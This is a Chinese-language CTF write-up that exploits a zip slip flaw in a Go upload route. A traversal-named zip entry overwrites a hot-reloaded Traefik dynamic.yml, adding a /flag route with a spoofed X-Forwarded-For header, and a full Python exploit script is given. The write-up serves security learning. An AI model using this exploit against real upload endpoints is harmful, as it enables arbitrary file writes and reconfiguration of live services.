# 任意文件写
/public/uplaod路由可以解压上传的zip文件，解压时文件名直接拼接，存在zip slip漏洞。
```go
for _, file := range zipReader.File {
  filePath := filepath.Join(destDir, file.Name)
```

ctf用户对/app/.config/dynamic.yml文件可写，可以覆盖配置文件。

# traefik热加载
traefik有两个配置文件，一个为静态的 需要重启才能加载更改，而dynamic.yml可以热加载。

文档：https://doc.traefik.io/traefik/getting-started/configuration-overview/
> The dynamic configuration contains everything that defines how the requests are handled by your system. This configuration can change and is seamlessly hot-reloaded, without any request interruption or connection loss.

/traefik/yml指定了动态配置文件的路径。动态配置可以更改路由。

添加一个flag路由即可访问/flag，顺便加一个添加X-Forward-For的中间件。

# 利用
```python
import requests
import zipfile
import os
import time

payload = '''
# Dynamic configuration

http:
  services:
    proxy:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8080"

  middlewares:
    addHeader:
      headers:
        customRequestHeaders:
          X-Forwarded-For: "127.0.0.1"

  routers:
    index:
      rule: Path(`/public/index`)
      entrypoints: [web]
      service: proxy
    upload:
      rule: Path(`/public/upload`)
      entrypoints: [web]
      service: proxy
    flag:
      rule: Path(`/flag`)
      entrypoints: [web]
      service: proxy
      middlewares: 
        - "addHeader"
'''

with open('./dynamic.yml', 'w') as f:
    f.write(payload)

zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo("poc.zip")
zipFile.write("./dynamic.yml", "../../../../../../../../../../app/.config/dynamic.yml", zipfile.ZIP_DEFLATED)
zipFile.close()

url = 'http://ip:port'

files = {
    'file' : open('./poc.zip', 'rb')
}

res = requests.post(url=url + '/public/upload', files=files)
print(res.text)

files['file'].close()
os.remove('./poc.zip')
os.remove('./dynamic.yml')

time.sleep(3)    # 等待热加载完成

flag = requests.get(url=url + '/flag')
print(flag.text)
```          